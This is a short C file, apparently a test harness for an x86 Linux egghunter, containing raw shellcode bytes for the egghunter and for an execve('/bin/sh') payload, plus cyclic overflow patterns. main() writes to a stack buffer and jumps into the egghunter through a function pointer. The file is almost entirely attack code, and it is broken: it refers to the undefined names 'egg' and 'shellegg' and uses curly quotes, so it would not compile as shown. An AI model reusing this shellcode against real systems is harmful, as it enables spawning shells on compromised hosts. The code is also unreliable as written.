#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define EGG "\x90\x50\x90\x50"
unsigned char egghunter[] =    "\x66\x81\xc9\xff\x0f\x41\x6a\x43"
                                "\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"
                                EGG
                                "\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";
unsigned char ptrn1[] = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6"
                        "Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A";
unsigned char ptrn2[] = "username:nio,password:matrix"
                        "Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A";

unsigned char shellcode[]=	"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08"
				"\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c"
				"\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff"
				"\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";
main()
{
printf("Egghunter Length: %d\n", sizeof(egghunter) - 1);
	char stack[400];
	printf(“Stack memory address of shellcode: %p\n”, stack);
	strncpy(stack, egg, 4);
	strncpy(stack+4, egg, 4);
	strncpy(stack+4+4, shellegg, sizeof(shellegg));
	int (*ret)() = (int(*)())egghunter;
	ret();
}




